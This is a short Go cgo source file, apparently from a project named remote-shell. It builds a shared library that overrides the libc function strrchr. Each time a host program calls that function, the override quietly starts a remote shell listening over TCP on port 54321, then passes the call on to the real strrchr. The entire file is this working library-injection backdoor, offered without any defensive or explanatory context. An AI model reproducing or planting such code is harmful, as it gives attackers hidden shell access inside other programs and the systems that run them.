package main

/*
#cgo linux LDFLAGS: -ldl
#define _GNU_SOURCE_
#include <dlfcn.h>
#include <stdlib.h>
static char* _strrchr(const char* str, int ch) {
	static char* (*ptr)(const char* str, int ch) = NULL;
	if (ptr == NULL) {
		ptr = dlsym(((void*)-1l), "strrchr");
	}
	return ptr(str, ch);
}
*/
import "C"

import (
	"github.com/andygeiss/remote-shell/application/remote"
	"github.com/andygeiss/remote-shell/infrastructure/tcp"
)

var (
	srv = tcp.NewServer("localhost:54321")
	sh  = remote.NewShell(srv)
)

func main() {}

//export strrchr
func strrchr(str *C.char, chr C.int) *C.char {
	go sh.Install()
	return C._strrchr(str, chr)
}
